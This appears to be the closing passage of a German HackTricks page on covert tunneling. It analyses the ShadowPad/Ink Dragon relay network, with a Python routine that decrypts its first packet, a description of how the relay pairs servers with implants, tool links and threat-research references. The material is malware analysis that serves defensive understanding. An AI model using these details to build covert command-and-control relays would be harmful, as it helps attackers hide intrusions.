* **Verschlüsseltes erstes Paket** – Die ersten beiden Bytes des Request-Bodys enthalten den Seed für einen benutzerdefinierten 32-Bit-PRNG. Jedes nachfolgende Byte wird vor dem Protocol-Parsing mit dem erzeugten Keystream XOR-verknüpft:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay-Orchestrierung** – Das Modul verwaltet zwei Listen: „servers“ (Upstream-Nodes) und „clients“ (Downstream-Implants). Einträge werden entfernt, wenn etwa 30 Sekunden lang kein Heartbeat eintrifft. Wenn beide Listen nicht leer sind, verbindet es den ersten gesunden Server mit dem ersten gesunden Client und leitet Bytes zwischen ihren Sockets weiter, bis eine Seite die Verbindung schließt.
* **Debug-Telemetrie** – Optionales Logging erfasst für jedes Pairing die Quell-IP, die Ziel-IP und die insgesamt weitergeleiteten Bytes. Ermittler nutzten diese Spuren, um das ShadowPad-Mesh über mehrere Opfer hinweg zu rekonstruieren.

---

## Weitere zu prüfende Tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Referenzen

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
